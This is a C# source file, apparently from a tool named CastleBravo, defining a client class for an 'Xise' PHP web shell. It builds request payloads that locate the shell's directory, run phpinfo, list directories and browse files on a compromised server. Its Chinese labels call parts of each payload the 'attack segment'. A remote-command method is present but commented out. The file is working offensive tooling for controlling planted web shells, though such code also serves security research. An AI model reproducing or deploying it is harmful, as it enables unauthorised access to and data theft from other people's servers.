using C2.Core;
using System;

namespace C2.Business.CastleBravo.WebShellTool
{
    class Xise19Client : CommonClient
    {
        String suffix;
        public Xise19Client(string password, string clientSetting)
            : base(password, clientSetting)
        {
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE + "&" + this.clientSetting.ACTION;
            suffix = "&" + this.clientSetting.PARAM1;
        }


        public override string PHPIndex()
        {
            string payload = String.Format("{0}={1}{2}={3}", prefix, clientSetting.PHP_INDEX, suffix,clientSetting.z9);

            sb.AppendLine("定位D洞所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
              .AppendLine();

            return payload;
        }

        public override string PHPInfo()
        {
            string payload = String.Format("{0}={1}{2}={3}", prefix, clientSetting.PHP_INFO, suffix,clientSetting.z9);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
              .AppendLine();

            return payload;
        }

        public override string PHPReadDict(string dict)
        {
            string payload = String.Format("{0}={1}{2}={3}&{4}={5}",
                prefix,
                clientSetting.PHP_READDICT,
                suffix,
                clientSetting.z9,
                clientSetting.PARAM2,
                ST.EncodeUrlBase64(dict));


            sb.AppendLine("遍历目录:")
             .AppendLine(payload)
             .AppendLine(string.Format("引导段:{0}", prefix))
             .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
             .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(dict)))
             .AppendLine();

            return payload;
        }

        /*
        public override string PHPShell(string shellEnv, string command)
        {
            string attack = ST.DecodeBase64(clientSetting.PHP_SHELL).Replace("@PARAM1", shellEnv).Replace("@PARAM2", command);
            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));

            sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload)
              .AppendLine(string.Format("攻击段:{0}", attack))
              .AppendLine(string.Format("执行路径:{0}", ST.SuperDecodeBase64(shellEnv)))
              .AppendLine(string.Format("命令:{0}", ST.SuperDecodeBase64(command)))
              .AppendLine();

            return payload;
        }
        */

        public override string DetailInfo(string PageData)
        {
            string payload = String.Format("{0}={1}&{2}={3}{4}={5}",
                 prefix,
                 clientSetting.z0,
                 clientSetting.PARAM2,
                 ST.EncodeUrlBase64(PageData),
                 suffix,
                 clientSetting.z9); 

            sb.AppendLine("文件浏览:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(PageData)))
              .AppendLine();

            return payload;
        }
    }
}
